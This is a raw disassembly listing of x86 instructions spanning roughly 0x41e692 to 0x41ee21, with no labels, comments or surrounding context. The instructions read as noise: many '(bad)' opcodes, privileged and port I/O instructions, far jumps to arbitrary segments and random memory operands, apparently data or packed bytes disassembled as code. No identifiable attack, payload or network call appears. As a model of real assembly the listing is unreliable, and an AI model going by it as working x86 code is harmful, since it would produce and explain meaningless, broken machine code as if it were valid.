  41e692:	(bad)  es:[ebx+ecx*1-0x7fd07561]
  41e69a:	ss in  al,0x4
  41e69d:	push   ecx
  41e69e:	dec    edi
  41e69f:	and    eax,0x76b7bd4f
  41e6a4:	mov    ds:0x784d9307,eax
  41e6a9:	cmc    
  41e6aa:	xor    ebx,ecx
  41e6ac:	jg     0x41e680
  41e6ae:	mov    ah,0xe9
  41e6b0:	xor    BYTE PTR [eax+0x26],al
  41e6b3:	push   ebp
  41e6b4:	pop    edi
  41e6b5:	pop    ecx
  41e6b6:	scas   al,BYTE PTR es:[edi]
  41e6b7:	jae    0x41e689
  41e6b9:	jb     0x41e6c1
  41e6bb:	xor    al,0x7f
  41e6bd:	sub    ch,BYTE PTR [edx]
  41e6bf:	addr16 inc edx
  41e6c1:	add    al,0x1d
  41e6c3:	repnz inc esi
  41e6c5:	xor    DWORD PTR [ebx+0x41ce3f95],0xc30bb102
  41e6cf:	mov    ah,0x9c
  41e6d1:	mov    eax,ds:0xc3532c24
  41e6d6:	das    
  41e6d7:	and    al,0x43
  41e6d9:	aam    0x2d
  41e6db:	sbb    DWORD PTR gs:[bx+si+0x26],esi
  41e6e0:	ror    BYTE PTR [esi+edi*2],0x9a
  41e6e4:	push   edx
  41e6e5:	jp     0x41e738
  41e6e7:	xchg   edx,eax
  41e6e8:	pop    es
  41e6e9:	or     ebp,ebp
  41e6eb:	call   0xda2598a3
  41e6f0:	push   esi
  41e6f1:	cli    
  41e6f2:	fdivr  QWORD PTR [edi+0x69]
  41e6f5:	jl     0x41e71d
  41e6f7:	ret    0xd8de
  41e6fa:	dec    ebx
  41e6fb:	cli    
  41e6fc:	cmp    DWORD PTR [eax],ebp
  41e6fe:	mov    al,ds:0xe7a2c244
  41e703:	mov    ds:0x72f64143,eax
  41e708:	fisub  DWORD PTR ds:0x30fd956f
  41e70e:	cwde   
  41e70f:	pop    ss
  41e710:	fs and ecx,esi
  41e713:	gs add ah,bl
  41e716:	sbb    al,0x5c
  41e718:	leave  
  41e719:	rol    DWORD PTR [ebp+0x791a42a2],1
  41e71f:	mov    ds:0xea45fbcb,eax
  41e724:	and    DWORD PTR [ecx+0x66a0a6ea],esi
  41e72a:	fisttp QWORD PTR [edx+0x4]
  41e72d:	mov    esi,fs
  41e72f:	repz xchg ebx,eax
  41e731:	pop    esi
  41e732:	(bad)  
  41e733:	lahf   
  41e734:	push   esi
  41e735:	out    dx,al
  41e736:	mov    edi,0xabd25cd1
  41e73b:	fcmovbe st,st(2)
  41e73d:	xlat   BYTE PTR ds:[ebx]
  41e73e:	mov    eax,0xc630d508
  41e743:	jne    0x41e792
  41e745:	pusha  
  41e746:	outs   dx,BYTE PTR ds:[esi]
  41e747:	shl    DWORD PTR [ebp+0x146873ff],cl
  41e74d:	cmp    BYTE PTR [ebx-0x6fea45ea],ch
  41e753:	mov    eax,0xf1a162c8
  41e758:	mov    dh,0xae
  41e75a:	mov    esi,0x5af00961
  41e75f:	ja     0x41e731
  41e761:	inc    ecx
  41e762:	outs   dx,BYTE PTR ds:[esi]
  41e763:	jns    0x41e701
  41e765:	aaa    
  41e766:	les    esi,FWORD PTR [edx-0x24]
  41e769:	stc    
  41e76a:	fcomi  st,st(2)
  41e76c:	xor    al,0x1c
  41e76e:	cli    
  41e76f:	call   0x3638:0xb12b5a06
  41e776:	dec    esp
  41e777:	xor    al,0xf0
  41e779:	push   ebp
  41e77a:	jge    0x41e788
  41e77c:	cmp    dl,al
  41e77e:	sub    al,0x6a
  41e780:	mov    edx,DWORD PTR [ebx+esi*8]
  41e783:	inc    esp
  41e784:	mul    BYTE PTR [edx+0x5fe98cff]
  41e78a:	mov    edi,DWORD PTR [eax+0x33]
  41e78d:	fdiv   st(0),st
  41e78f:	mov    eax,ds:0xbccca5a7
  41e794:	loopne 0x41e7e1
  41e796:	sbb    DWORD PTR [edi-0x11],ecx
  41e799:	popf   
  41e79a:	iret   
  41e79b:	push   eax
  41e79c:	mov    BYTE PTR [ecx],ch
  41e79e:	cmp    dl,BYTE PTR [ecx+0x27]
  41e7a1:	push   es
  41e7a2:	loope  0x41e7eb
  41e7a4:	dec    edx
  41e7a5:	(bad)  
  41e7a6:	lods   eax,DWORD PTR ds:[esi]
  41e7a7:	sahf   
  41e7a8:	(bad)  
  41e7a9:	inc    esp
  41e7aa:	mov    cl,0x14
  41e7ac:	inc    dl
  41e7ae:	rol    DWORD PTR [ebp+0x53],0xff
  41e7b2:	inc    edx
  41e7b3:	sub    eax,0x66f6eecf
  41e7b8:	int    0xee
  41e7ba:	stos   BYTE PTR es:[edi],al
  41e7bb:	cmp    ecx,DWORD PTR ds:0xf4706298
  41e7c1:	jmp    0x713d:0xa4e4ad3
  41e7c8:	(bad)  
  41e7c9:	loop   0x41e74d
  41e7cb:	imul   esp,DWORD PTR [edx+0x2f900ff7],0xdbd2405c
  41e7d5:	push   ecx
  41e7d6:	mov    al,ds:0xe7b85783
  41e7db:	jo     0x41e7d9
  41e7dd:	push   esp
  41e7de:	shr    al,1
  41e7e0:	push   ds
  41e7e1:	sub    ecx,DWORD PTR [ebx+ebp*1+0x2f97b434]
  41e7e8:	sahf   
  41e7e9:	imul   edx,DWORD PTR [ebx],0xc52d6590
  41e7ef:	ins    BYTE PTR es:[edi],dx
  41e7f0:	shl    BYTE PTR [esi+eiz*2+0x761ed1c8],0x28
  41e7f8:	mov    ecx,0xe0141d8e
  41e7fd:	packssdw mm2,QWORD PTR [eax-0x62e965bf]
  41e804:	jecxz  0x41e82e
  41e806:	add    al,0xa0
  41e808:	(bad)  
  41e80a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e80b:	(bad)  
  41e80c:	test   DWORD PTR [ebx+0x3c],0x69acd7fb
  41e813:	(bad)  
  41e814:	push   ebx
  41e815:	jbe    0x41e7b9
  41e817:	mov    es,esp
  41e819:	inc    ebp
  41e81a:	out    0xdf,eax
  41e81c:	and    eax,DWORD PTR es:[edx+0x507d9d83]
  41e823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e824:	fs das 
  41e826:	jl     0x41e7da
  41e828:	out    0xbb,eax
  41e82a:	fs cdq 
  41e82c:	sbb    bl,BYTE PTR [ebx+0x31338395]
  41e832:	test   BYTE PTR [ebp+0xf],dh
  41e835:	jb     0x41e89c
  41e837:	jle    0x41e87d
  41e839:	ret    0xe6b0
  41e83c:	xchg   edi,eax
  41e83d:	sub    dh,BYTE PTR [edi]
  41e83f:	(bad)  
  41e841:	cli    
  41e842:	jae    0x41e8a1
  41e844:	xchg   esp,eax
  41e845:	cmp    al,0xc
  41e847:	jg     0x41e7e8
  41e849:	mov    eax,ss:0x7a69bf06
  41e84f:	sub    DWORD PTR [ebx],ebx
  41e851:	leave  
  41e852:	mov    BYTE PTR [eax-0x1],bl
  41e855:	sub    DWORD PTR [ebp-0x948af89],ebp
  41e85b:	sub    dl,BYTE PTR [esi+eax*2-0x2e43b657]
  41e862:	sar    BYTE PTR [ebx],cl
  41e864:	dec    esp
  41e865:	dec    edi
  41e866:	mov    esp,0x21c84a91
  41e86b:	imul   edx,DWORD PTR [ebp+0x3f],0x64
  41e86f:	les    esp,FWORD PTR [ebp+0x79]
  41e872:	jl     0x41e852
  41e874:	sbb    al,0x7c
  41e876:	fucomi st,st(5)
  41e878:	xchg   esp,eax
  41e879:	sbb    DWORD PTR [edi+0x29aa5421],edx
  41e87f:	repz jge 0x41e83a
  41e882:	lds    ecx,FWORD PTR [esi+0x487bcff9]
  41e888:	or     eax,0x15b2eb6a
  41e88d:	sahf   
  41e88e:	rcl    DWORD PTR [ebp+eiz*2-0x21],0xeb
  41e893:	xchg   edx,eax
  41e894:	cmp    eax,0x6dbb2aa2
  41e899:	fisttp DWORD PTR [edx-0x50]
  41e89c:	dec    edx
  41e89d:	push   ecx
  41e89e:	pop    es
  41e89f:	stos   BYTE PTR es:[edi],al
  41e8a0:	push   es
  41e8a1:	jno    0x41e866
  41e8a3:	movaps xmm6,XMMWORD PTR [edx+0x6eecb8c6]
  41e8aa:	add    cl,al
  41e8ac:	adc    dh,BYTE PTR [edi+0x67]
  41e8af:	(bad)  
  41e8b0:	out    0x1c,eax
  41e8b2:	pushf  
  41e8b3:	pop    ebp
  41e8b4:	jle    0x41e872
  41e8b6:	stos   DWORD PTR es:[edi],eax
  41e8b7:	mov    WORD PTR [ebp-0x1bbe4e87],fs
  41e8bd:	dec    ebp
  41e8be:	push   cs
  41e8bf:	sbb    eax,0x1b485518
  41e8c4:	push   ebx
  41e8c5:	xor    DWORD PTR [ebx+0x30],edi
  41e8c8:	mov    ebx,0x276df32a
  41e8cd:	in     al,0x89
  41e8cf:	imul   ebp,esp,0x4
  41e8d2:	mov    es,WORD PTR [ebx-0x4]
  41e8d5:	(bad)  
  41e8d7:	mov    ebp,0x46817427
  41e8dc:	cmp    bl,ah
  41e8de:	ds inc DWORD PTR es:[esi-0x693b9f2b]
  41e8e6:	mov    cl,0x96
  41e8e8:	xor    esp,0xcb61e98
  41e8ee:	dec    ebp
  41e8ef:	dec    esp
  41e8f0:	pop    ebp
  41e8f1:	xchg   ecx,eax
  41e8f2:	mov    DWORD PTR [eax-0x4c98b89e],ebx
  41e8f8:	mov    edi,DWORD PTR [ebx+edi*4+0x11]
  41e8fc:	lock pop edx
  41e8fe:	cmp    BYTE PTR [ebp-0x74],cl
  41e901:	push   0x3a
  41e903:	mov    WORD PTR [esi+eiz*8+0x1d],fs
  41e907:	neg    DWORD PTR [ebx+0xf]
  41e90a:	outs   dx,DWORD PTR ds:[esi]
  41e90b:	fidiv  DWORD PTR [edi+0x28]
  41e90e:	ds push edx
  41e910:	mov    al,0x38
  41e912:	cmp    ah,BYTE PTR [ebp-0x73]
  41e915:	out    0x73,eax
  41e917:	(bad)  
  41e918:	rcr    DWORD PTR [edi-0x4d],cl
  41e91b:	mov    bh,0xa8
  41e91d:	jbe    0x41e8b2
  41e91f:	in     al,dx
  41e920:	cmp    DWORD PTR [edi+0xc540efe],ebp
  41e926:	mov    edx,DWORD PTR [di+0x24]
  41e92a:	xor    edx,ecx
  41e92c:	int    0x39
  41e92e:	in     eax,dx
  41e92f:	mov    edx,0x7a10c1e9
  41e934:	mov    esp,0xf612cfe5
  41e939:	pop    esi
  41e93a:	jg     0x41e974
  41e93c:	cmp    bh,BYTE PTR [esi]
  41e93e:	jmp    0x8d20:0xb7e7fab9
  41e945:	cmp    DWORD PTR [eax],edx
  41e947:	ret    0x7733
  41e94a:	aas    
  41e94b:	xor    ecx,DWORD PTR [ecx-0x492d2250]
  41e951:	shl    DWORD PTR [edx],0xe6
  41e954:	jl     0x41e94c
  41e956:	retf   0x87e6
  41e959:	(bad)  
  41e95a:	jmp    0x5b80:0xf323ccb3
  41e961:	icebp  
  41e962:	jmp    0x75df:0x1692e1bd
  41e969:	fmul   st,st(6)
  41e96b:	push   cs
  41e96c:	pop    eax
  41e96d:	mov    dh,0x28
  41e96f:	lods   al,BYTE PTR ds:[esi]
  41e970:	pop    ebp
  41e971:	jg     0x41e9c3
  41e973:	sbb    DWORD PTR [edx-0x74],0xe45f4235
  41e97a:	or     eax,DWORD PTR [ebp+0xe4c1231]
  41e980:	xor    DWORD PTR [edx],eax
  41e982:	cld    
  41e983:	and    dl,al
  41e985:	mov    dl,0x12
  41e987:	retf   
  41e988:	out    dx,eax
  41e989:	mov    ecx,0xe5809dea
  41e98e:	(bad)  
  41e98f:	std    
  41e990:	dec    edi
  41e991:	pushf  
  41e992:	inc    esi
  41e993:	(bad)  
  41e994:	mov    ah,BYTE PTR [edx]
  41e996:	and    DWORD PTR es:[ebx-0x26],edx
  41e99a:	int    0x28
  41e99c:	mov    bl,0xa1
  41e99e:	retf   0x79b6
  41e9a1:	fwait
  41e9a2:	es popa 
  41e9a4:	lds    eax,FWORD PTR [edx+0x2b225d42]
  41e9aa:	daa    
  41e9ab:	dec    eax
  41e9ac:	jb     0x41e977
  41e9ae:	mov    si,0x4b46
  41e9b2:	push   edi
  41e9b3:	dec    eax
  41e9b4:	jp     0x41e9bf
  41e9b6:	inc    esi
  41e9b7:	or     BYTE PTR [ecx+0x5f330467],0x26
  41e9be:	jnp    0x41e95e
  41e9c0:	dec    ebp
  41e9c1:	hlt    
  41e9c2:	or     ch,dl
  41e9c4:	push   ebp
  41e9c5:	mov    dh,0xfd
  41e9c7:	add    ah,BYTE PTR [esi+0x436dd26b]
  41e9cd:	jo     0x41ea37
  41e9cf:	inc    ecx
  41e9d0:	test   DWORD PTR [edi-0x1a89cda7],ecx
  41e9d6:	sub    DWORD PTR [eax-0x3c940864],esi
  41e9dc:	mov    al,ds:0x529e2737
  41e9e1:	es mov esp,0x7fc5e9e0
  41e9e7:	fidivr WORD PTR [esi+0x2a]
  41e9ea:	test   esp,eax
  41e9ec:	imul   esi,DWORD PTR [ebx-0x3b],0xffffffb8
  41e9f0:	sti    
  41e9f1:	mov    esp,0x11f619d
  41e9f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9f7:	lods   eax,DWORD PTR ds:[esi]
  41e9f8:	and    al,0x84
  41e9fa:	and    DWORD PTR [ebx],0xffffffc2
  41e9fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9fe:	mov    dh,BYTE PTR [ebp-0x5e399e48]
  41ea04:	dec    ecx
  41ea05:	inc    edi
  41ea06:	out    dx,eax
  41ea07:	mov    bl,0xf1
  41ea09:	test   al,0x51
  41ea0b:	mov    ebp,0xc4a06e32
  41ea10:	int    0x20
  41ea12:	icebp  
  41ea13:	data16 arpl WORD PTR [ebp+0x6c],sp
  41ea17:	stos   BYTE PTR es:[edi],al
  41ea18:	rol    BYTE PTR [edi+edi*4-0x66],0xe
  41ea1d:	pop    edx
  41ea1e:	data16 jge 0x41ea34
  41ea21:	pop    esp
  41ea22:	pusha  
  41ea23:	dec    ebp
  41ea24:	(bad)  
  41ea25:	dec    ebx
  41ea26:	and    edi,esi
  41ea28:	inc    ebx
  41ea29:	loop   0x41ea3c
  41ea2b:	lods   al,BYTE PTR ds:[esi]
  41ea2c:	js     0x41ea38
  41ea2e:	push   eax
  41ea2f:	adc    esp,DWORD PTR [esp+edx*2]
  41ea32:	stos   BYTE PTR es:[edi],al
  41ea33:	call   0x22ad:0x8367e650
  41ea3a:	push   edi
  41ea3b:	inc    ebx
  41ea3c:	mov    ecx,0x8c7ccba5
  41ea41:	pop    ebx
  41ea42:	ss ret 0x4bd5
  41ea46:	mov    edi,0xb13741c3
  41ea4b:	xor    al,0x2b
  41ea4d:	add    eax,0x47ebbf45
  41ea52:	mov    edx,DWORD PTR ds:0xc07844af
  41ea58:	call   0x8c7abad3
  41ea5d:	pop    ebp
  41ea5e:	xor    ebp,DWORD PTR [esi-0x37d9be41]
  41ea64:	dec    edx
  41ea65:	aam    0x6f
  41ea67:	inc    DWORD PTR ds:0x58860f9d
  41ea6d:	bound  edi,QWORD PTR [ecx*1-0x58b19687]
  41ea74:	add    ebx,DWORD PTR [esi+0x4271aba3]
  41ea7a:	or     al,0x51
  41ea7c:	lods   eax,DWORD PTR ds:[esi]
  41ea7d:	aad    0xa3
  41ea7f:	jl     0x41ea47
  41ea81:	bound  esp,QWORD PTR [edx+0x73]
  41ea84:	sub    esp,esi
  41ea86:	lods   eax,DWORD PTR ds:[esi]
  41ea87:	mov    al,0xb4
  41ea89:	jb     0x41eac7
  41ea8b:	rcr    DWORD PTR [edx+0x599194],cl
  41ea91:	in     eax,dx
  41ea92:	stos   BYTE PTR es:[edi],al
  41ea93:	jp     0x41ea83
  41ea95:	or     al,0x93
  41ea97:	outs   dx,BYTE PTR fs:[esi]
  41ea99:	xchg   BYTE PTR [eax],bl
  41ea9b:	xchg   eax,ebp
  41ea9d:	and    eax,0x35254165
  41eaa2:	jmp    0xb6d844b4
  41eaa7:	sti    
  41eaa8:	pop    eax
  41eaa9:	retf   
  41eaaa:	add    edi,DWORD PTR [edi+0x655dbf29]
  41eab0:	and    al,0x66
  41eab2:	xor    BYTE PTR ds:0xa12e2c04,ch
  41eab8:	rcl    DWORD PTR [eax],cl
  41eaba:	mov    WORD PTR [ecx+0x5],?
  41eabd:	pop    ds
  41eabe:	push   es
  41eabf:	or     eax,0xe4ac8a59
  41eac4:	xor    eax,DWORD PTR [ebp-0x5d]
  41eac7:	test   BYTE PTR fs:0xbc35c71f,bl
  41eace:	mov    ch,0x79
  41ead0:	push   ebx
  41ead1:	scas   al,BYTE PTR es:[edi]
  41ead2:	in     al,dx
  41ead3:	add    ebp,ebx
  41ead5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ead6:	adc    al,0xe4
  41ead8:	loope  0x41eb4a
  41eada:	mov    bh,0x9a
  41eadc:	sar    BYTE PTR [edi*8+0x73e10b7d],1
  41eae3:	call   0x69c1:0xbaad0871
  41eaea:	mov    ch,0x9a
  41eaec:	aad    0xe9
  41eaee:	arpl   WORD PTR [ebp+0x16],bp
  41eaf1:	mov    ds:0xf76c96ab,al
  41eaf6:	xor    dl,BYTE PTR [ebx]
  41eaf8:	(bad)  
  41eaf9:	fsubr  QWORD PTR [esi]
  41eafb:	not    edi
  41eafd:	lahf   
  41eafe:	xadd   ah,ah
  41eb01:	add    ch,BYTE PTR [eax-0x25082344]
  41eb07:	fstp   TBYTE PTR [esi+ebx*4-0x7166cb05]
  41eb0e:	sti    
  41eb0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb10:	test   eax,0x2d66ab24
  41eb15:	xor    dl,BYTE PTR [ecx]
  41eb17:	out    0x42,al
  41eb19:	jmp    DWORD PTR [eax-0x3de507bc]
  41eb1f:	lea    ebp,[edx-0x783308b1]
  41eb25:	std    
  41eb26:	loopne 0x41eb96
  41eb28:	mov    ebp,0x6551cf39
  41eb2d:	test   dl,al
  41eb2f:	int    0x90
  41eb31:	call   0x9e81852a
  41eb36:	gs retf 0xd354
  41eb3a:	out    dx,eax
  41eb3b:	or     al,0x3f
  41eb3d:	xor    eax,0x68650bac
  41eb42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb43:	pop    esp
  41eb44:	rcl    BYTE PTR [ecx],0x52
  41eb47:	xchg   al,al
  41eb49:	sub    BYTE PTR [ecx+0x7a],bh
  41eb4c:	inc    ebx
  41eb4d:	ret    
  41eb4e:	clc    
  41eb4f:	mov    ecx,0xfeb3b102
  41eb54:	pop    eax
  41eb55:	push   esi
  41eb56:	mov    al,ds:0x9ff7f32d
  41eb5b:	int    0x79
  41eb5d:	in     eax,0x74
  41eb5f:	psrld  mm6,mm0
  41eb62:	sub    al,0x5
  41eb64:	cmc    
  41eb65:	xor    DWORD PTR [ebp+eax*2-0x4ef23e7d],ebp
  41eb6c:	scas   al,BYTE PTR es:[edi]
  41eb6d:	imul   edx,ebp,0x2c54e681
  41eb73:	cmp    edx,ebx
  41eb75:	push   esp
  41eb76:	adc    esp,DWORD PTR [eax]
  41eb78:	mov    al,dh
  41eb7a:	pop    eax
  41eb7b:	or     al,0x29
  41eb7d:	mov    al,BYTE PTR [edx]
  41eb7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb80:	add    al,0x31
  41eb82:	arpl   WORD PTR [ecx-0x35c7426d],bp
  41eb88:	shl    edi,0xf9
  41eb8b:	and    eax,DWORD PTR [ebx-0x5c]
  41eb8e:	lahf   
  41eb8f:	je     0x41eb61
  41eb91:	inc    esp
  41eb92:	es push ebx
  41eb94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb95:	add    ecx,esp
  41eb97:	mov    bh,0x81
  41eb99:	lock retf 0x2d6c
  41eb9d:	ret    
  41eb9e:	jne    0x41ebb6
  41eba0:	in     al,dx
  41eba1:	jl     0x41ebde
  41eba3:	jno    0x41ec1a
  41eba5:	mov    DWORD PTR [eax*2+0x7b824d41],ebx
  41ebac:	xchg   ebx,eax
  41ebad:	dec    esp
  41ebae:	imul   edx,DWORD PTR ds:[eax-0x1e],0x6b
  41ebb3:	(bad)
  41ebb8:	loope  0x41eba4
  41ebba:	and    DWORD PTR [eax+0x60],0x23
  41ebbe:	mov    ds:0x69d06a2a,eax
  41ebc3:	cwde   
  41ebc4:	xchg   DWORD PTR [eax-0x7edbc1cd],ecx
  41ebca:	xchg   edx,eax
  41ebcb:	jmp    0x838a05a2
  41ebd0:	pusha  
  41ebd1:	mov    bl,0x42
  41ebd3:	pop    edx
  41ebd4:	inc    edi
  41ebd5:	jge    0x41ec20
  41ebd7:	lock add eax,0xdba28fe9
  41ebdd:	jecxz  0x41ebef
  41ebdf:	add    al,0x63
  41ebe1:	int3   
  41ebe2:	out    0x5f,eax
  41ebe4:	jnp    0x41eb67
  41ebe6:	in     eax,0xe8
  41ebe8:	stos   DWORD PTR es:[edi],eax
  41ebe9:	pop    ds
  41ebea:	adc    BYTE PTR [edx],cl
  41ebec:	mov    dh,0xa3
  41ebee:	lds    eax,FWORD PTR [ebx-0x7c]
  41ebf1:	gs jb  0x41ec0a
  41ebf4:	add    DWORD PTR [ebx-0x36b0b0d8],ecx
  41ebfa:	sti    
  41ebfb:	fcom   DWORD PTR [esi-0x3372319]
  41ec01:	xchg   edx,eax
  41ec02:	stc    
  41ec03:	mov    edx,0xfa1b6d07
  41ec08:	stos   DWORD PTR es:[edi],eax
  41ec09:	dec    ebx
  41ec0a:	inc    ebp
  41ec0b:	sbb    ebx,ebx
  41ec0d:	repnz dec esi
  41ec0f:	or     DWORD PTR [eax+0x6b],edi
  41ec12:	std    
  41ec13:	hlt    
  41ec14:	lock xor DWORD PTR [esi],ecx
  41ec17:	les    eax,FWORD PTR [ebp-0x1f]
  41ec1a:	lods   al,BYTE PTR ds:[esi]
  41ec1b:	mov    dh,0xcc
  41ec1d:	(bad)  
  41ec1e:	pop    ebx
  41ec1f:	xchg   ebp,eax
  41ec20:	mov    dl,0xfe
  41ec22:	push   0xb88f8b99
  41ec27:	lods   eax,DWORD PTR ds:[esi]
  41ec28:	or     DWORD PTR [esi+0x3f658776],esp
  41ec2e:	fild   DWORD PTR ds:0x51eb6db5
  41ec34:	ds pop ebx
  41ec36:	cmp    edi,esi
  41ec38:	adc    eax,DWORD PTR [edi-0x1c23fbbe]
  41ec3e:	scas   al,BYTE PTR es:[edi]
  41ec3f:	stos   DWORD PTR es:[edi],eax
  41ec40:	or     DWORD PTR [esi+ebx*8-0x197027d6],0x1375ab4a
  41ec4b:	test   al,0x63
  41ec4d:	mov    WORD PTR [eax-0x3d],gs
  41ec50:	(bad)  
  41ec51:	fsub   DWORD PTR [ebx+esi*8-0x8]
  41ec55:	mov    esi,0xa41a4e7
  41ec5a:	je     0x41ec31
  41ec5c:	mov    WORD PTR [ebx],ss
  41ec5e:	pop    ecx
  41ec5f:	mov    ds:0x7842fabd,eax
  41ec64:	sar    cl,cl
  41ec66:	sub    eax,0x5c2fce64
  41ec6b:	pushf  
  41ec6c:	scas   eax,DWORD PTR es:[edi]
  41ec6d:	in     al,dx
  41ec6e:	ds dec ecx
  41ec70:	and    dl,BYTE PTR [edx+0x238864c7]
  41ec76:	jecxz  0x41ec20
  41ec78:	call   0xc868:0x27bc8da
  41ec7f:	adc    al,BYTE PTR [ebp-0x5513757e]
  41ec85:	scas   eax,DWORD PTR es:[edi]
  41ec86:	shl    al,cl
  41ec88:	out    0xd0,al
  41ec8a:	arpl   WORD PTR [edi-0x26c49896],di
  41ec90:	fidiv  DWORD PTR [eax-0x589f7d69]
  41ec96:	mov    esp,0xf87e4a70
  41ec9b:	xor    eax,0x8ae3ce86
  41eca0:	fnstsw WORD PTR [edx]
  41eca2:	pop    edx
  41eca3:	adc    ebp,DWORD PTR [ecx+ebx*1-0x5a8029a8]
  41ecaa:	xchg   ecx,eax
  41ecab:	dec    edi
  41ecac:	cwde   
  41ecad:	pop    ss
  41ecae:	cmp    BYTE PTR [edi+0x771ba61b],dl
  41ecb4:	jmp    0xc3df:0x79d24534
  41ecbb:	lods   eax,DWORD PTR ds:[esi]
  41ecbc:	jmp    0x41ec9b
  41ecbe:	ss push ebp
  41ecc0:	fsubr  QWORD PTR ds:0x5526e912
  41ecc6:	cmc    
  41ecc7:	push   cs
  41ecc8:	xchg   ebx,eax
  41ecc9:	jl     0x41ed1d
  41eccb:	shl    BYTE PTR [esi-0x2a58da15],0x81
  41ecd2:	sbb    BYTE PTR [edx],ch
  41ecd4:	push   0xffffffcd
  41ecd6:	stos   BYTE PTR es:[edi],al
  41ecd7:	xor    eax,0xf462a420
  41ecdc:	shl    DWORD PTR [esi+0x6b],0xd
  41ece0:	ror    BYTE PTR [ebp-0x6d],cl
  41ece3:	push   esp
  41ece4:	jge    0x41ed53
  41ece6:	mov    BYTE PTR [esi+0x0],0xf4
  41ecea:	mov    edi,ebx
  41ecec:	bound  ebp,QWORD PTR [esi-0x4cb95ee2]
  41ecf2:	imul   BYTE PTR [ebx+0x11087496]
  41ecf8:	call   FWORD PTR [edx+0x6]
  41ecfb:	push   ecx
  41ecfc:	push   es
  41ecfd:	add    eax,0xa8826b2a
  41ed02:	stc    
  41ed03:	jg     0x41ed7d
  41ed05:	adc    BYTE PTR [ebx-0x11cebfe5],ah
  41ed0b:	and    eax,eax
  41ed0d:	inc    ebx
  41ed0e:	mov    al,ds:0x77b54b3d
  41ed13:	mul    BYTE PTR [esi-0x7e6334f8]
  41ed19:	or     BYTE PTR [edx-0x19dfcd2e],al
  41ed1f:	stos   BYTE PTR es:[edi],al
  41ed20:	fidiv  DWORD PTR [edx+0x3a67c05b]
  41ed26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed27:	dec    esi
  41ed28:	inc    eax
  41ed29:	mov    ebx,cr3
  41ed2c:	stos   BYTE PTR es:[di],al
  41ed2e:	add    dl,al
  41ed30:	stos   DWORD PTR es:[edi],eax
  41ed31:	test   eax,0xc370152f
  41ed36:	cmc    
  41ed37:	jl     0x41ed4b
  41ed39:	xor    ecx,ebp
  41ed3b:	pop    esp
  41ed3c:	mov    bl,0x63
  41ed3e:	popf   
  41ed3f:	or     dl,BYTE PTR [ebx-0x24e347e3]
  41ed45:	hlt    
  41ed46:	jl     0x41ed3b
  41ed48:	push   edi
  41ed49:	mov    bh,dh
  41ed4b:	push   eax
  41ed4c:	mov    ds:0x941f2334,al
  41ed51:	sti    
  41ed52:	out    0xdd,al
  41ed54:	dec    ebx
  41ed55:	dec    ebx
  41ed56:	std    
  41ed57:	push   cs
  41ed58:	mov    ebx,0x787f14f1
  41ed5d:	pop    ebx
  41ed5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed5f:	fist   WORD PTR [esp+esi*8-0x10]
  41ed63:	ins    BYTE PTR es:[edi],dx
  41ed64:	in     al,0x55
  41ed66:	jbe    0x41ed77
  41ed68:	mov    dh,BYTE PTR [edi]
  41ed6a:	and    eax,0x85ec21b6
  41ed6f:	dec    esi
  41ed70:	add    BYTE PTR [edi+0x3a],bl
  41ed73:	xor    BYTE PTR [ebp+0xf],0xe1
  41ed77:	cmc    
  41ed78:	add    al,0x17
  41ed7a:	out    dx,al
  41ed7b:	mov    esp,0x52a556f9
  41ed80:	jb     0x41edc8
  41ed82:	mov    edx,0x18ca385c
  41ed87:	push   0xfffffffe
  41ed89:	cli    
  41ed8a:	pop    ebp
  41ed8b:	push   esi
  41ed8c:	ret    0x2967
  41ed8f:	loop   0x41edca
  41ed91:	push   esi
  41ed92:	mov    esi,0x223aa88e
  41ed97:	shl    BYTE PTR [bp+si+0x2363],1
  41ed9c:	je     0x41edd6
  41ed9e:	sub    cl,al
  41eda0:	pusha  
  41eda1:	xchg   ebx,ecx
  41eda3:	jge    0x41ed60
  41eda5:	pop    ecx
  41eda6:	xor    ecx,DWORD PTR [edi+0x15094ff0]
  41edac:	out    0x5,al
  41edae:	mov    ch,0x6c
  41edb0:	rcr    al,1
  41edb2:	add    al,0x69
  41edb4:	xchg   esp,eax
  41edb5:	dec    eax
  41edb6:	push   ecx
  41edb7:	dec    edx
  41edb8:	enter  0x8013,0x5c
  41edbc:	and    BYTE PTR [esi],ah
  41edbe:	add    dl,BYTE PTR [eax+0x73]
  41edc1:	addr16 pop ss
  41edc3:	neg    BYTE PTR [edx+edx*1]
  41edc6:	repz sub al,0xad
  41edc9:	inc    ebx
  41edca:	pop    edx
  41edcb:	std    
  41edcc:	pusha  
  41edcd:	imul   edx,DWORD PTR [ebp+eiz*1-0x36],0x79
  41edd2:	xchg   edx,eax
  41edd3:	sub    eax,0x5fdfe779
  41edd8:	add    BYTE PTR [esi+eiz*4],dl
  41eddb:	or     dl,BYTE PTR [edi+0x20]
  41edde:	and    bh,cl
  41ede0:	add    BYTE PTR [ebp-0x16],ch
  41ede3:	adc    DWORD PTR [ebp+edi*1+0x2c86bf27],ebx
  41edea:	cld    
  41edeb:	cwde   
  41edec:	nop
  41eded:	and    edi,DWORD PTR [ebp-0x70]
  41edf0:	inc    esp
  41edf1:	cmp    BYTE PTR [ecx-0x6635a68f],ah
  41edf7:	sub    dl,BYTE PTR ds:0xb517a5fe
  41edfd:	ret    0x65f
  41ee00:	fincstp 
  41ee02:	jp     0x41ee59
  41ee04:	inc    ebp
  41ee05:	mov    dh,0x19
  41ee07:	inc    ebx
  41ee08:	jno    0x41ee72
  41ee0a:	test   eax,0x8ff24a52
  41ee0f:	push   edi
  41ee10:	in     al,0x86
  41ee12:	jbe    0x41ee67
  41ee14:	jnp    0x41ed97
  41ee16:	mov    esi,ecx
  41ee18:	mov    dl,0xae
  41ee1a:	into   
  41ee1b:	cs int3 
  41ee1d:	inc    eax
  41ee1e:	jb     0x41ee69
  41ee20:	inc    ebp
  41ee21:	outs   dx,DWORD PTR ds:[esi]
